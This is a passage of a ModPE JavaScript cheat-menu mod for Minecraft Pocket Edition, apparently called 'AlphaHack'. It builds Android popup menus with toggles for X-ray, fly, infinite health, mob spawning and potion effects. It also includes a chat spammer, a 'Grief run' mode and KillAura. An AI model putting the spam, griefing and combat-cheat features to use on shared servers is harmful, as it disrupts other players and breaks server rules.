var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter text to spam!");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(mm);
Layer.addView(Exit);

mm.setText("AlphaHack!");
Exit.setText("Start/Stop");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
text =mm.getText();
Dialog.dismiss();
pee2();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Spam Dialog Is Malfunctioning:"+e);
}
}});
}

function pee2() {
sspam?sspam=false:sspam=true;
spam.setText("Spammer: "+(sspam?"on":"off"));
}

var cs = new Button(ctx);
            cs.setText("Sign editor");        
            cs.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    clientMessage("§7This is already enabled, tap a sign!");
print("§7This is already enabled, tap a sign!");
                }
            }));
            zmenuLayout.addView(cs);

function signEditor() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var xy = new android.widget.EditText(ctx);
var xy2 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter sign line & text");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(xy);
Layer.addView(xy2);
Layer.addView(Exit);

xy.setText("");
xy.setHint("Sign line: (1-4)");
xy2.setText("");
xy2.setHint("New sign text");
Exit.setText("done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
text4 =xy.getText();
line4 =xy2.getText();
Level.setSignText(notex, notey, notez, line4, text4);
Dialog.dismiss();
print("sign text changed!");
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The signer Dialog Is Malfunctioning:"+e);
}
}});
}

function useItem(x, y, z, itemId, blockId, side){
if(blockId == 323 || blockId == 68) {
            notex = x;
            notey = y;
            notez = z;

            //print("idek");
        }
print("idek");
}

var ray = new android.widget.Button(ctx);
      ray.setText("X-ray: "+(xxray?"on":"off"));
		ray.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         xxray?xxray=false:xxray=true;
ray.setText("X-ray: "+(xxray?"on":"off"));
if(xxray == true){
clientMessage("§7X-ray is on");
Block.setRenderLayer(1,1);

Block.setRenderLayer(2,1);

Block.setRenderLayer(3,1);

Block.setRenderLayer(12,1);

Block.setRenderLayer(24,1);

Block.setRenderLayer(78,1);
xxray = true;
}
if(xxray == false){
clientMessage("§7X-ray is off");
Block.setRenderLayer(1,num0);

Block.setRenderLayer(2,num0);

Block.setRenderLayer(3,num0);

Block.setRenderLayer(12,num0);

Block.setRenderLayer(24,num0);

Block.setRenderLayer(78,num0);
xxray = false;
                }
			}
		});
		zmenuLayout.addView(ray);

var status = new android.widget.Button(ctx);
      status.setText("MC Status: "+(stat22?"on":"off"));
		status.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         stat22?stat22=false:stat22=true;
status.setText("MC Status: "+(stat22?"on":"off"));
if(stat22 == true){
clientMessage("§7Status on");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/hud off");
clientMessage("§7T = time, W = weather, B = biome, ID = item id, G = gamemode.");
stat22 = true;
}
if(stat22 == false){
clientMessage("§7Status off");

stat22 = false;
                }
			}
		});
		zmenuLayout.addView(status);

var creative = new Button(ctx);
            creative.setText("Creative");        
            creative.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.setGameMode(1);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode 1");
clientMessage("§7Your gamemode was updated to creative mode!");
                }
            }));
            zmenuLayout.addView(creative);
 
            var survival = new Button(ctx);
            survival.setText("Survival");        
            survival.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.setGameMode(0);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode 0");
clientMessage("§7Your gamemode was updated to survival mode!");
                }
            }));
            zmenuLayout.addView(survival);

var att = new Button(ctx);
            att.setText("Nametag");        
            att.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){ 
nameMe(); 

                }
            }));
            zmenuLayout.addView(att);

function nameMe() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var nt = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter nickname");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(nt);
Layer.addView(Exit);

nt.setText("");
nt.setHint("New nickname");
Exit.setText("done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
nametgg =nt.getText();
Dialog.dismiss();
setName();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The setName Dialog Is Malfunctioning:"+e);
}
}});
}

function setName(){
Entity.setNameTag(Player.getEntity(), nametgg);
}

var fp = new android.widget.Button(ctx);
            fp.setText("FPS: "+(showp?"on":"off"));
            fp.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
                showp?showp=false:showp=true;
fp.setText("FPS: "+(showp?"on":"off"));
                }
            }));
            zmenuLayout.addView(fp);

/*      var coord = new Button(ctx);
            coord.setText("Coordinates: "+(cords?"on":"off"));            
            coord.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
cords?cords=false:cords=true;
coord.setText("Coordinates: "+(cords?"on":"off"));
                }
            }));
            zmenuLayout.addView(coord);

var world = new Button(ctx);
            world.setText("World info");         
            world.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    clientMessage("§7Minecraft PE Version: " + ModPE.getMinecraftVersion());
                    clientMessage("§aWorld Name: " + Level.getWorldName());
                    clientMessage("§2Biome: " + Level.getBiomeName());
                    clientMessage("§9Gamemode: " + Level.getGameMode());
                }
            }));
            zmenuLayout.addView(world);

var win = new Button(ctx);
            win.setText("Weather info");       
            win.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    clientMessage("§dLightning " + Math.round(Level.getLightningLevel()));
clientMessage("§5Rain/snow " + Math.round(Level.getRainLevel()));
                }
            }));
            zmenuLayout.addView(win);

var tin = new Button(ctx);
            tin.setText("Time info");       
            tin.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    clientMessage("§6Time: " + Level.getTime());
clientMessage("§eWorlds Sunlight: " + Level.getBrightness(Player.getX(), Player.getY() - 1, Player.getZ()));
                }
            }));
            zmenuLayout.addView(tin);

var fo = new android.widget.Button(ctx);
      fo.setText("Item info");
		fo.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             clientMessage("§dItem ID: " + Player.getCarriedItem());
             clientMessage("§eAmount in hand: " + Player.getCarriedItemCount());
             clientMessage("§5Data / damage: " + Player.getCarriedItemData());
			}
		});
		zmenuLayout.addView(fo);*/

var hea = new android.widget.Button(ctx);
      hea.setText("Heal hearts");
		hea.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             Player.setHealth(20);
             clientMessage("§7Health healed");
			}
		});
		zmenuLayout.addView(hea);

var hun = new android.widget.Button(ctx);
      hun.setText("Heal hunger");
		hun.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             Player.setHunger(25);
             clientMessage("§7Hunger healed");
			}
		});
		zmenuLayout.addView(hun);

var mm = new android.widget.Button(ctx);
      mm.setText("Infinite health: "+(stackheart?"on":"off"));
		mm.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         stackheart?stackheart=false:stackheart=true;
mm.setText("Infinite health: "+(stackheart?"on":"off"));
if(stackheart == true){
stackheart = true;
clientMessage("§7infinite health is on");
}
if(stackheart == false){
clientMessage("§7infinite health is off");
Player.setHealth(20);
stackheart = false;
                }
			}
		});
		zmenuLayout.addView(mm);

var zm = new android.widget.Button(ctx);
      zm.setText("1 hit kill: "+(instakilled?"on":"off"));
		zm.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         instakilled?instakilled=false:instakilled=true;
zm.setText("1 hit kill: "+(instakilled?"on":"off"));
if(instakilled == true){
instakilled = true;
clientMessage("§7Insta kill is on");
}
if(instakilled == false){
clientMessage("§7Insta kill is off");
instakilled = false;
                }
			}
		});
		zmenuLayout.addView(zm);

var zmm = new android.widget.Button(ctx);
      zmm.setText("Ride mobs: "+(saddle?"on":"off"));
		zmm.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             saddle?saddle=false:saddle=true;
zmm.setText("Ride mobs: "+(saddle?"on":"off"));
if(saddle == true){
clientMessage("§7Ride mobs is on");
clientMessage("§cTap mob to ride,\n§cJump to get off mob.");
saddle = true;
}
if(saddle == false){
clientMessage("§7Ride mobs is off");
saddle = false;
                }
			}
		});
		zmenuLayout.addView(zmm);

var zmmm = new android.widget.Button(ctx);
      zmmm.setText("Instant break: "+(instabreak?"on":"off"));
		zmmm.setOnClickListener(new android.view.View.OnClickListener() {
		 onClick: function(v){
 instabreak?instabreak=false:instabreak=true;
zmmm.setText("Instant break: "+(instabreak?"on":"off"));
if(instabreak == true){
instaDestroy();
clientMessage("§7Instant break is on");
}
if(instabreak == false){
clientMessage("§7Instant break is off");
defaultDestroy();
                }
			}
		});
		zmenuLayout.addView(zmmm);

var f = new android.widget.Button(ctx);
            f.setText("Fly in survival: "+(fch?"on":"off"));
            f.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
fch?fch=false:fch=true;
f.setText("Fly in survival: "+(fch?"on":"off"));
if(fch == true){
Player.setCanFly(1);
clientMessage("§7Fly in survival is on");
}
if(fch == false){
clientMessage("§7Fly in survival is off");
Player.setCanFly(0);
                }
}
            }));
            zmenuLayout.addView(f);

var p = new android.widget.Button(ctx);
            p.setText("Fun particle: "+(parti?"on":"off"));
            p.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
parti?parti=false:parti=true;
p.setText("Fun particle: "+(parti?"on":"off"));
if(parti == true){
clientMessage("§o§cE§bn§aj§eo§dy §1f§2u§3n §4p§5a§6r§7t§8i§9c§0l§fe§l!");
parti2 = true;
parti = true;
}
if(parti == false){
clientMessage("§7Fun particles off");
parti2 = false;
parti = false;
                }
}
            }));
            zmenuLayout.addView(p);

var no = new android.widget.Button(ctx);
      no.setText("Walk through walls: "+(nowalls?"on":"off"));
		no.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         nowalls?nowalls=false:nowalls=true;
no.setText("Walk through walls: "+(nowalls?"on":"off"));
if(nowalls == true){
nowalls = true;
clientMessage("§7Walk through walls on");
Entity.setCollisionSize(getPlayerEnt(), 0.1, 0.1);
}
if(nowalls == false){
clientMessage("§7Walk through walls off");
Entity.setCollisionSize(getPlayerEnt(), 1, 2);
nowalls = false;
}
			}
		});
		zmenuLayout.addView(no);

var ww = new android.widget.Button(ctx);
            ww.setText("Walk on water: "+(waterwalk?"on":"off"));
            ww.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
waterwalk?waterwalk=false:waterwalk=true;
ww.setText("Walk on water: "+(waterwalk?"on":"off"));
if(waterwalk == true){
clientMessage("§7You can now walk on water!");
}
if(waterwalk == false){
clientMessage("§7No longer walk on water!");
                }
}
            }));
            zmenuLayout.addView(ww);

var hj = new android.widget.Button(ctx);
            hj.setText("Super jump: "+(highjumps?"on":"off"));
            hj.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
highjumps?highjumps=false:highjumps=true;
hj.setText("Super jump: "+(highjumps?"on":"off"));
if(highjumps == true){
clientMessage("§7Super jump on");
highjumps = true;
}
if(highjumps == false){
clientMessage("§7Super jump off");
highjumps = false;
                }
}
            }));
            zmenuLayout.addView(hj);

var g = new android.widget.Button(ctx);
            g.setText("Grief run: "+(grief?"on":"off"));
            g.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
grief?grief=false:grief=true;
g.setText("Grief run: "+(grief?"on":"off"));
if(grief == true){
clientMessage("§7Your now griefing! hurry run around!");
grief = true;
}
if(grief == false){
clientMessage("§7You stopped griefing!");
grief = false;
                }
}
            }));
            zmenuLayout.addView(g);

var kl = new android.widget.Button(ctx);
            kl.setText("KillAura: "+(killaura?"on":"off"));
            kl.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
killaura?killaura=false:killaura=true;
kl.setText("KillAura: "+(killaura?"on":"off"));
if(killaura == true){
clientMessage("§7KillAura on");
killaura = true;
}
if(killaura == false){
clientMessage("§7KillAura off");
killaura = false;
                }
}
            }));
            zmenuLayout.addView(kl);

var kl2 = new android.widget.Button(ctx);
            kl2.setText("FreezeAura: "+(killfaura?"on":"off"));
            kl2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
killfaura?killfaura=false:killfaura=true;
kl2.setText("FreezeAura: "+(killfaura?"on":"off"));
if(killfaura == true){
clientMessage("§7FreezeAura on");
killfaura = true;
}
if(killfaura == false){
clientMessage("§7FreezeAura off");
killfaura = false;
                }
}
            }));
            zmenuLayout.addView(kl2);

var ui = new android.widget.Button(ctx);
            ui.setText("Ui Layout Viewer: "+(uirender?"on":"off"));
            ui.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
uirender?uirender=false:uirender=true;
ui.setText("Ui Layout Viewer: "+(uirender?"on":"off"));
if(uirender == true){
ModPE.setUiRenderDebug(true);
}
if(uirender == false){
ModPE.setUiRenderDebug(false);
                }
}
            }));
            zmenuLayout.addView(ui);

		var B_exit = new android.widget.Button(ctx);
		B_exit.setText("Exit");
		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             zmenu.dismiss();
showMenuBtn();
			}
		});
		zmenuLayout.addView(B_exit);

            zmenu = new PopupWindow(zmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            zmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            zmenu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function smenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var smenuLayout = new LinearLayout(ctx);
            var smenuScroll = new ScrollView(ctx);
            var smenuLayout1 = new LinearLayout(ctx);
            smenuLayout.setOrientation(1);
            smenuLayout1.setOrientation(1);
            smenuScroll.addView(smenuLayout);
            smenuLayout1.addView(smenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		smenuLayout.addView(MainTitle);
            
            var T_title = new android.widget.TextView(ctx); T_title.setGravity(android.view.Gravity.CENTER);
		T_title.setText("Spawn Menu");
       T_title.setTextColor(GUIName);
		T_title.setTextSize(20);
		smenuLayout.addView(T_title);

var A_exit = new android.widget.Button(ctx);
		A_exit.setText("Exit");
		A_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             smenu.dismiss();
showMenuBtn();
			}
		});
		smenuLayout.addView(A_exit);


var spawn10 = new Button(ctx);
            spawn10.setText("Spawn Chicken");      
            spawn10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 10);
                }
            }));
            smenuLayout.addView(spawn10);

var spawn11 = new Button(ctx);
            spawn11.setText("Spawn Cow");
            spawn11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 11);
                }
            }));
            smenuLayout.addView(spawn11);
            
            var spawn12 = new Button(ctx);
            spawn12.setText("Spawn Pig");
            spawn12.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 12);
                }
            }));
            smenuLayout.addView(spawn12);
            
            var spawn13 = new Button(ctx);
            spawn13.setText("Spawn Sheep");
            spawn13.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 13);
                }
            }));
            smenuLayout.addView(spawn13);
            
            var spawn14 = new Button(ctx);
            spawn14.setText("Spawn Wolf");
            spawn14.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 14);
                }
            }));
            smenuLayout.addView(spawn14);
            
            var spawn15 = new Button(ctx);
            spawn15.setText("Spawn Villager");
            spawn15.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 15);
                }
            }));
            smenuLayout.addView(spawn15);
            
            var spawn16 = new Button(ctx);
            spawn16.setText("Spawn Mushrom cow");
            spawn16.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 16);
                }
            }));
            smenuLayout.addView(spawn16);
            
            var spawn17 = new Button(ctx);
            spawn17.setText("Spawn Squid");
            spawn17.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 17);
                }
            }));
            smenuLayout.addView(spawn17);
            
            var spawn18 = new Button(ctx);
            spawn18.setText("Spawn Rabbit");
            spawn18.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 18);
                }
            }));
            smenuLayout.addView(spawn18);
            
            var spawn19 = new Button(ctx);
            spawn19.setText("Spawn Bat");
            spawn19.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 19);
                }
            }));
            smenuLayout.addView(spawn19);
            
            var spawn20 = new Button(ctx);
            spawn20.setText("Spawn Iron golem");
            spawn20.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 20);
                }
            }));
            smenuLayout.addView(spawn20);
            
            var spawn21 = new Button(ctx);
            spawn21.setText("Spawn Snow golem");
            spawn21.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 21);
                }
            }));
            smenuLayout.addView(spawn21);
            
            var spawn22 = new Button(ctx);
            spawn22.setText("Spawn Ocelot");
            spawn22.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 22);
                }
            }));
            smenuLayout.addView(spawn22);

var spawn32 = new Button(ctx);
            spawn32.setText("Spawn Zombie");
            spawn32.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 32);
                }
            }));
            smenuLayout.addView(spawn32);

var spawn33 = new Button(ctx);
            spawn33.setText("Spawn Creeper");
            spawn33.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 33);
                }
            }));
            smenuLayout.addView(spawn33);

var spawn34 = new Button(ctx);
            spawn34.setText("Spawn Skeleton");
            spawn34.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 34);
                }
            }));
            smenuLayout.addView(spawn34);
            
            var spawn35 = new Button(ctx);
            spawn35.setText("Spawn Spider");
            spawn35.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 35);
                }
            }));
            smenuLayout.addView(spawn35);
            
            var spawn36 = new Button(ctx);
            spawn36.setText("Spawn Zombie pigman");
            spawn36.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 36);
                }
            }));
            smenuLayout.addView(spawn36);
            
            var spawn37 = new Button(ctx);
            spawn37.setText("Spawn Slime");
            spawn37.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 37);
                }
            }));
            smenuLayout.addView(spawn37);
            
            var spawn38 = new Button(ctx);
            spawn38.setText("Spawn Enderman");     
            spawn38.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 38);
                }
            }));
            smenuLayout.addView(spawn38);
            
            var spawn39 = new Button(ctx);
            spawn39.setText("Spawn Silverfish");
            spawn39.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 39);
                }
            }));
            smenuLayout.addView(spawn39);

var spawn40 = new Button(ctx);
            spawn40.setText("Spawn Cave spider"); 
            spawn40.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 40);
                }
            }));
            smenuLayout.addView(spawn40);

var spawn41 = new Button(ctx);
            spawn41.setText("Spawn Ghast");      
            spawn41.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 41);
                }
            }));
            smenuLayout.addView(spawn41);

var spawn42 = new Button(ctx);
            spawn42.setText("Spawn Magma cube");
            spawn42.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 42);
                }
            }));
            smenuLayout.addView(spawn42);

var spawn43 = new Button(ctx);
            spawn43.setText("Spawn Blaze");       
            spawn43.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 43);
                }
            }));
            smenuLayout.addView(spawn43);

var spawn44 = new Button(ctx);
            spawn44.setText("Spawn Zombie villager");
            spawn44.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 44);
                }
            }));
            smenuLayout.addView(spawn44);

var spawn66 = new Button(ctx);
            spawn66.setText("Spawn Witch");            
            spawn66.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 45);
                }
            }));
            smenuLayout.addView(spawn66);

		var B_exit = new android.widget.Button(ctx);
		B_exit.setText("Exit");
		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             smenu.dismiss();
showMenuBtn();
			}
		});
		smenuLayout.addView(B_exit);

            smenu = new PopupWindow(smenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            smenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            smenu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function emenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var emenuLayout = new LinearLayout(ctx);
            var emenuScroll = new ScrollView(ctx);
            var emenuLayout1 = new LinearLayout(ctx);
            emenuLayout.setOrientation(1);
            emenuLayout1.setOrientation(1);
            emenuScroll.addView(emenuLayout);
            emenuLayout1.addView(emenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		emenuLayout.addView(MainTitle);
            
            var y_title = new android.widget.TextView(ctx); y_title.setGravity(android.view.Gravity.CENTER);
		y_title.setText("Effect Menu");
       y_title.setTextColor(GUIName);
		y_title.setTextSize(20);
		emenuLayout.addView(y_title);

var C_exit = new android.widget.Button(ctx);
		C_exit.setText("Exit");
		C_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             emenu.dismiss();
showMenuBtn();
			}
		});
		emenuLayout.addView(C_exit);

            var mov = new Button(ctx);
            mov.setText("Remove all effect");
            mov.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                 //Entity.removeAllEffects(player);
Entity.removeAllEffects(getPlayerEnt());
                }
            }));
            emenuLayout.addView(mov);

var e1 = new Button(ctx);
            e1.setText("saturation");
            e1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ea();
                }
            }));
            emenuLayout.addView(e1);

function ea() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn1();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn1() {
Entity.addEffect(getPlayerEnt(), MobEffect.saturation, s*l, 0, false, true);
}
            
            var e2 = new Button(ctx);
            e2.setText("Absorption");
            e2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eb();
                }
            }));
            emenuLayout.addView(e2);

function eb() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn2();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn2() {
Entity.addEffect(getPlayerEnt(), MobEffect.absorption, s*l, 0, false, true);
}

var e3 = new Button(ctx);
            e3.setText("Health boost");
            e3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
  ec();
                }
            }));
            emenuLayout.addView(e3);

function ec() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn3();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn3() {
Entity.addEffect(getPlayerEnt(), MobEffect.healthBoost, s*l, 0, false, true);
}

var e4 = new Button(ctx);
            e4.setText("Wither");
            e4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ed();
                }
            }));
            emenuLayout.addView(e4);

function ed() {
